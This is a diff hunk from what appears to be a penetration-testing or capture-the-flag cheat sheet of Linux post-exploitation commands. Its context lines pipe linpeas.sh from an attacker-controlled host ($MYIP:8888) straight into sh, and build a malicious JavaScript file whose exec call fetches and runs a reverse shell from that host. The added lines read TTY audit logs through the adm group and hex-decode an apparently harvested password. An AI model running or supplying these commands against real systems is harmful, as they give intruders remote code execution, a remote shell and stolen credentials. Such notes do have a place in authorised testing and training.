@@ -1416,6 +1416,10 @@ curl -s http://$MYIP:8888/linux/linpeas.sh | sh
 newgrp developer
 find / -group developer 2>/dev/null
 
+newgrp adm
+aureport --tty
+echo "6D7262336E5F41634064336D79210A" | xxd -r -p
+
 +---------- Malicious Files ----------+
 -->> .js
 echo -e 'const { exec } = require('child_process');\nexec('curl $MYIP:8888/resh_5566|sh', (err, stdout, stderr) => {});
